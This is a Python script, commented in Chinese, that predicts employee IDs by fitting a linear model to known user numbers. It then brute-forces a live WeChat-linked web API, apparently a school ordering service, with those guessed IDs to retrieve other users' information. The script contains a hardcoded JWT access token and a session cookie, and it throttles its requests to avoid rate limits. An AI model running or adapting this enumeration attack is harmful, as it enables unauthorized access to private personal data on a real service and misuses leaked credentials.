# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================
#                                      STAGE 1：拟合
# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================

import time

import numpy as np
# import matplotlib.pyplot as plt

# 真实数据：x = 可读序号，y = empId后缀的十进制值
data = [
    (2241029, '31a6025a'),
    (2241089, '386d02d2'),
    (2241112, '3b3b0300'),
    (2241240, '4acc0400'),
    (2241093, '38ea02da')
]

x_real = np.array([d[0] for d in data])
y_real = np.array([int(d[1], 16) for d in data])  # 十六进制转十进制

# 线性拟合（最小二乘法）
slope, intercept = np.polyfit(x_real, y_real, 1)

# 生成拟合直线上的点（用于绘图）
x_line = np.linspace(min(x_real)-50, max(x_real)+50, 100)
y_line = slope * x_line + intercept

# # 预测 x = 2241040
# x_pred = 2241040
# y_pred = slope * x_pred + intercept
# # 将预测的y转回十六进制后缀（补齐8位，去掉'0x'）
# suffix_pred = format(int(y_pred), '08x')  # 取整
# print(f"预测的后缀: {suffix_pred}")
# print(f"完整empId: 8a8c48b5907be12e01917769{suffix_pred}")

# # 绘图：图一 原始数据与拟合直线
# plt.figure(figsize=(10, 6))
# plt.scatter(x_real, y_real, color='blue', s=80, label='real')
# plt.plot(x_line, y_line, color='black', linestyle='-', linewidth=2, label='line')
# plt.scatter(x_pred, y_pred, color='red', s=120, marker='*', label=f'predict (x={x_pred})')

# # 添加标注
# plt.xlabel('userno (x)', fontsize=12)
# plt.ylabel('empId (base 10)', fontsize=12)
# plt.legend()
# plt.grid(True, linestyle='--', alpha=0.6)

# # 显示预测值在坐标轴上的数值
# plt.annotate(f'({x_pred}, {int(y_pred)})', 
#              xy=(x_pred, y_pred), 
#              xytext=(x_pred+20, y_pred-500000),
#              arrowprops=dict(facecolor='red', shrink=0.05),
#              fontsize=10, color='red')

# # 图二：残差图（residuals）
# # 计算拟合值与残差
# y_fit_at_x_real = slope * x_real + intercept
# residuals = y_real - y_fit_at_x_real

# plt.figure(figsize=(10, 4))
# plt.axhline(0, color='gray', linestyle='--', linewidth=1)
# plt.scatter(x_real, residuals, color='purple', s=80)
# for xi, r in zip(x_real, residuals):
#     plt.annotate(f'{int(r)}', xy=(xi, r), xytext=(0, 4), textcoords='offset points', fontsize=9)
# plt.xlabel('userno (x)', fontsize=12)
# plt.ylabel('residual (observed - fitted)', fontsize=12)
# plt.title('Residuals')
# plt.grid(True, linestyle='--', alpha=0.5)

# plt.tight_layout()
# plt.show()


# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================
#                                      STAGE 2：brute force
# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================
# =======================================================================================


import requests

def tryone(tail):

    # 请求 URL 和查询参数
    url = "http://wxdc.szsy.cn/api/wechat/getUserInfo"
    params = {
        "empId": f"8a8c48b5907be12e01917769{tail}",
        "empType": 1
    }

    # 请求头（Host 和 Content-Length 会被 requests 自动处理，无需手动添加）
    headers = {
        "Proxy-Connection": "keep-alive",
        "X-Access-Token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3ODU5NzQ3MDIsInVzZXJpZCI6IjhhOGM0OGI1OTA3YmUxMmUwMTkxNzc2OTM4ZWEwMmRhIiwidXNlcm5hbWUiOiIyMjQxMDkzIn0.xGYzIraWZp7DtE4udi67Vb8wO4md1iTxca7G5oqYjS4",
        "CENTER_ID": "9053",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.181 Mobile Safari/537.36 XWEB/1500047 MMWEBSDK/20260502 MMWEBID/2946 REV/81629b608a3192dcef2447cdbefc087c13c086c0 MicroMessenger/8.0.76.3141(0x28004C3A) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
        "Accept": "application/json, text/plain, */*",
        "Origin": "http://wxdc.szsy.cn",
        "X-Requested-With": "com.tencent.mm",
        "Referer": "http://wxdc.szsy.cn/order/homePage",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en-CN;q=0.8,en-US;q=0.7,en;q=0.6"
    }

    # Cookie
    cookies = {
        "JSESSIONID": "F7A60CA39D8335680FB40861608AFEA1"
    }

    # 发送 POST 请求（无请求体）
    response = requests.post(
        url,
        params=params,
        headers=headers,
        cookies=cookies
    )

    if response.json().get("code") == 200:
        return True, response.json()
    else:
        return False, response.json()

def trydir(userno):
    # use slope, intercept from the previous stage to predict the suffix
    y_pred = slope * userno + intercept

    # logic: use y_pred as the central point, and try +-1.5e ~ +-2.5e6
    for subranges in [range(int(-2.5e6), int(-1.5e6)), range(int(1.5e6), int(2.5e6))]:
        for offset in subranges:
            tail = format(int(y_pred) + offset, '08x')
            success, response = tryone(tail)
            if success:
                print(f"Found! userno: {userno}, empId: 8a8c48b5907be12e01917769{tail}")
                print("Response:", response)
                return True
            time.sleep(0.01)  # to avoid being rate-limited

print(trydir(2241030))
# print(trydir(2241031))
# print(trydir(2241032))
# print(trydir(2241033))
